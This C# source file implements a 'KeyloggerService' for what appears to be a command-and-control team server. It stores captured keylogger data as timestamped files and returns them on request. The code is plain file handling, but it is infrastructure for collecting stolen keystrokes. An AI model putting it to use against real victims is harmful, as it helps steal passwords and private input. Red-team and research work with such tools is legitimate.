using TeamServer.Interface;
using Trinity.Shared.Errors;
using Trinity.Shared.Results;

namespace TeamServer.Services;

public sealed class KeyloggerService : IKeyloggerService
{
    private readonly string _dataDirectory;

    public KeyloggerService(IWebHostEnvironment environment)
    {
        _dataDirectory = Path.Combine(environment.ContentRootPath, "data");
        Directory.CreateDirectory(_dataDirectory);
    }

    public async Task<Result<string>> SaveDataAsync(string data)
    {
        if (data is null)
        {
            return FileError.EmptyFile();
        }

        var fileName = $"keylogger_data_{DateTime.UtcNow:yyyyMMdd_HHmmss_fff}.txt";
        var filePath = Path.Combine(_dataDirectory, fileName);

        await File.WriteAllTextAsync(filePath, data);
        return fileName;
    }

    public async Task<Result<byte[]>> GetFileAsync(string fileName)
    {
        var safeFileName = Path.GetFileName(fileName);
        if (string.IsNullOrWhiteSpace(safeFileName) || safeFileName is "." or "..")
        {
            return FileError.FileNotFound(fileName);
        }

        var filePath = Path.Combine(_dataDirectory, safeFileName);
        if (!File.Exists(filePath))
        {
            return FileError.FileNotFound(safeFileName);
        }

        return await File.ReadAllBytesAsync(filePath);
    }
}
